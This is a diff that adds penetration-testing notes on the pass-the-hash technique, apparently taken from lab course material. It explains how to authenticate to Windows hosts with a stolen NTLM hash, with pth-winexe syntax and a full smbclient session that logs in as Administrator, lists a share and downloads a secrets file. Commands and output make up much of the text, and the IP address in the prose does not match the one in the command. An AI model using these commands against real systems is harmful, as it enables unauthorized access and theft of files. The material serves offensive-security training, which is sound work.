@@ -8,3 +8,32 @@ Basic syntax w/ NTLM hash (pass the hash technique):
 pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe
 
 Additional details about the command can be found here. https://tools.kali.org/maintaining-access/winexe
+
+
+
+
+smbclient pTh
+For SMB enumeration and management, we can use smbclient or CrackMapExec. 
+For command execution, we can use the scripts from the impacket library like psexec.py and wmiexec.py. 
+We can also use NTLM hashes to not only connect to target systems with SMB, but also via other protocols like RDP and WinRM, if the user has the required rights. 
+We can also use Mimikatz to conduct pass-the-hash as well.
+
+To use the command, we need to enter the path of the share as the first argument by escaping the backslashes. 
+In this case, we will enter \\\\192.168.59.212\\secrets. 
+We'll use the -U Administrator to set the user and --pw-nt-hash to indicate the hash.
+
+After we successfully connect to the SMB share "secrets" with smbclient, we can list all files in the SMB share with dir. 
+We can also use the get command to download files to our Kali machine.
+
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+
+kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Thu Jun  2 16:55:37 2022
+  ..                                DHS        0  Thu Jun  2 16:55:35 2022
+  secrets.txt                         A        4  Thu Jun  2 11:34:47 2022
+                4554239 blocks of size 4096. 771633 blocks available
+smb: \> get secrets.txt
+getting file \secrets.txt of size 4 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+    Listing 44 - Using smbclient with NTLM hash
